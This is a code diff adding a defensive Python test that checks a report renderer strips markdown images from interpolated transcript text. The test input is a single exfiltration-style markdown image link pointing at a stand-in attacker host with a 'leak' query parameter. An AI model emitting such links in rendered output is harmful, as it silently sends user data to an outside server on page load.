@@ -523,6 +523,22 @@ def test_markdown_block_escapes_raw_html():
     assert "&lt;script&gt;" in html and "<em>ok</em>" in html
 
 
+def test_markdown_block_does_not_emit_images():
+    """A report is opened without interaction, so an image would fetch
+    its URL on open; interpolated transcript text must not reach one."""
+    from transect.report import custom
+    from transect.report.blocks import Markdown
+
+    ctx = custom.SectionContext(transcript_id="t", frame=None, n_turns=0)
+    html = str(
+        custom._markdown(
+            Markdown("![](http://attacker.example/x.png?d=leak) *ok*"), ctx
+        )
+    )
+    assert "<img" not in html
+    assert "<em>ok</em>" in html
+
+
 def test_tag_spend_bars_splits_new_work_with_an_untagged_bucket():
     """Tagged spend sums per label, the remainder lands in the
     untagged bucket, and shares stay against the full total; the
